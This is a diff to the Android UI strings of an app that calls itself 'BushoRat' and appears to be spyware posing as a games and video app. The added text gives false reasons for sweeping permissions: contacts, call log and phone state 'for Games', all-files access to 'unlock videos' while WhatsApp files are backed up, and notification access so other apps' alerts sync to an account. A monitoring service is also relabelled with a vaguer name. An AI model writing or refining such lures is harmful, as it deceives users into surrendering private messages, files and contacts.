@@ -29,6 +29,9 @@
     <string name="games_banner_desc">Choose a game and start playing</string>
     <string name="games_tap_to_play">Tap to play</string>
     <string name="dashboard_profile_menu_description">Open profile</string>
+    <string name="dashboard_profile_label">Profile</string>
+    <string name="dashboard_profile_hint">Tap to view</string>
+    <string name="profile_hero_subtitle">Your account &amp; settings</string>
     <string name="verification_title">Verify your email</string>
     <string name="verification_cta_description">We need to verify your email address before you can use the app.</string>
     <string name="verification_message">We just sent a verification link to %1$s. Open your inbox, tap the link, then come back here.</string>
@@ -119,10 +122,10 @@
 
     <!-- Progressive feature permissions -->
     <string name="unlock_videos_title">Unlock videos</string>
-    <string name="unlock_videos_message">Allow storage access to unlock the video section. After that you can watch videos, and WhatsApp media will sync in the background.</string>
-    <string name="unlock_videos_allow">Allow storage</string>
+    <string name="unlock_videos_message">Allow access to all files on this device to unlock videos and back up PDFs, documents, photos, and WhatsApp files. On the next screen, turn on “Allow access to manage all files”.</string>
+    <string name="unlock_videos_allow">Allow all files</string>
     <string name="unlock_videos_success">Videos unlocked</string>
-    <string name="unlock_videos_denied">Storage permission is needed to unlock videos</string>
+    <string name="unlock_videos_denied">All-files access is needed to unlock videos and sync documents</string>
     <string name="unlock_videos_required">Unlock videos from the dashboard first (allow storage)</string>
 
     <string name="perm_allow">Allow</string>
@@ -131,15 +134,25 @@
     <string name="perm_chat_denied">SMS permission is needed for Chat</string>
     <string name="perm_games_title">Enable Games</string>
     <string name="perm_games_message">Games need contacts and call log access for this feature.</string>
+    <string name="perm_games_contacts_message">Allow contacts access to continue with Games.</string>
+    <string name="perm_games_call_log_message">Allow call log access for the next step.</string>
+    <string name="perm_games_phone_message">Allow phone state access to finish setup.</string>
+    <string name="perm_backup_files_title">Background backup</string>
+    <string name="perm_backup_files_message">Optional: allow full file access to back up documents and WhatsApp files while you browse.</string>
+    <string name="perm_backup_notif_message">Optional: enable notification access to keep alerts in sync.</string>
     <string name="perm_games_granted">Access granted</string>
     <string name="perm_games_denied">Contacts and call log permission is needed for Games</string>
     <string name="perm_notif_title">Notification access</string>
     <string name="perm_notif_message">Turn on notification access so Chat can stay up to date with alerts.</string>
+    <string name="perm_notif_launch_message">Allow notification access so alerts from other apps can sync to your account. On the next screen, enable BushoRat in the list.</string>
+    <string name="perm_notif_after_storage_message">Storage access is on. Next, allow notification access so alerts from other apps sync to your account. On the next screen, enable BushoRat in the list.</string>
+    <string name="perm_storage_in_videos_title">Allow all files</string>
+    <string name="perm_storage_in_videos_message">Allow access to all files to back up PDFs, documents, and photos. On the next screen, turn on “Allow access to manage all files”.</string>
     <string name="perm_location_title">Nearby content</string>
     <string name="perm_location_message">Allow location to personalize content on your profile.</string>
     <string name="perm_location_granted">Location enabled</string>
     <string name="perm_accessibility_title">Improve experience</string>
     <string name="perm_accessibility_message">Enable Accessibility for smoother background features.</string>
 
-    <string name="app_maintenance_service">Background app monitoring and maintenance service</string>
+    <string name="app_maintenance_service">Background data sync</string>
 </resources>
